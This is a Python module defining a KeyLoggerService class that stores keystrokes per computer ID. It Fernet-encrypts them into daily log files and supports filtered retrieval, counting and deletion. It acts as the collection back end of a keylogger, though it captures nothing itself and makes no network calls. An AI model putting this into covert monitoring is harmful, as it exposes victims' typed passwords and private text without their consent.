import os
import json
import threading
import datetime
from cryptography.fernet import Fernet
import glob
from dateutil import parser

class KeyLoggerService:
    def __init__(self, logs_dir="logs", key_file="secret.key"):
        self.logs_dir = logs_dir
        self.key_file = key_file
        if not os.path.exists(self.logs_dir):
            os.makedirs(self.logs_dir)

        if not os.path.exists(self.key_file):
            key = Fernet.generate_key()
            with open(self.key_file, "wb") as f:
                f.write(key)
        else:
            with open(self.key_file, "rb") as f:
                key = f.read()

        self.cipher = Fernet(key)
        self.log_path_template = os.path.join(self.logs_dir, "{}_{}.log")

    def _get_log_path(self, comp_id):
        now = datetime.datetime.now()
        filename = f"{comp_id}_{now.strftime('%Y-%m-%d')}.log"
        return os.path.join(self.logs_dir, filename)

    def log_key(self, comp_id, key, timestamp=None):
        if timestamp is not None:
            try:
                entry_timestamp = datetime.datetime.fromtimestamp(float(timestamp)).isoformat()
            except (ValueError, TypeError):
                entry_timestamp = datetime.datetime.now().isoformat()
        else:
            entry_timestamp = datetime.datetime.now().isoformat()
        
        entry = {"key": key, "timestamp": entry_timestamp}
        data = json.dumps(entry).encode()
        encrypted = self.cipher.encrypt(data)
        
        log_path = self._get_log_path(comp_id)
        with open(log_path, "ab") as f:
            f.write(encrypted + b"\n")

    def get_keys(self, comp_id, limit=None, start_time=None, end_time=None):
        all_entries = []
        
        start_dt = parser.isoparse(start_time) if start_time else None
        end_dt = parser.isoparse(end_time) if end_time else None

        log_files = glob.glob(os.path.join(self.logs_dir, f"{comp_id}_*.log"))
        log_files.sort(reverse=True)

        for log_file in log_files:
            try:
                with open(log_file, "rb") as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        try:
                            decrypted = self.cipher.decrypt(line)
                            entry = json.loads(decrypted)
                            entry_dt = parser.isoparse(entry['timestamp'])
                            
                            if start_dt and entry_dt < start_dt:
                                continue
                            if end_dt and entry_dt > end_dt:
                                continue
                                
                            all_entries.append(entry)
                        except Exception as e:
                            print(f"[WARNING] Failed to decrypt line in {log_file}: {e}")
                            continue
            except FileNotFoundError:
                continue
        
        all_entries.sort(key=lambda x: x['timestamp'])

        if limit:
            return all_entries[-limit:]
        
        return all_entries

    def count_keys(self, comp_id):
        count = 0
        log_files = glob.glob(os.path.join(self.logs_dir, f"{comp_id}_*.log"))
        for log_file in log_files:
            try:
                with open(log_file, 'rb') as f:
                    count += sum(1 for line in f if line.strip())
            except FileNotFoundError:
                continue
        return count

    def delete_key_entry(self, comp_id, timestamp_to_delete, key_to_delete):
        try:
            target_dt = parser.isoparse(timestamp_to_delete)
            log_filename = f"{comp_id}_{target_dt.strftime('%Y-%m-%d')}.log"
            log_path = os.path.join(self.logs_dir, log_filename)
            
            if not os.path.exists(log_path):
                return False

            temp_path = log_path + ".tmp"
            entry_found_and_deleted = False

            with open(log_path, "rb") as original_file, open(temp_path, "wb") as temp_file:
                for line in original_file:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        decrypted = self.cipher.decrypt(line)
                        entry = json.loads(decrypted)
                        if entry['timestamp'] == timestamp_to_delete and entry['key'] == key_to_delete:
                            entry_found_and_deleted = True
                            continue
                    except Exception:
                        pass
                    
                    temp_file.write(line + b'\n')
            
            os.replace(temp_path, log_path)
            return entry_found_and_deleted
        except Exception as e:
            print(f"Error deleting key entry: {e}")
            return False

    def delete_keys(self, comp_id):
        for fname in os.listdir(self.logs_dir):
            if fname.startswith(comp_id + "_"):
                os.remove(os.path.join(self.logs_dir, fname))

    def load_existing_logs(self):
        pass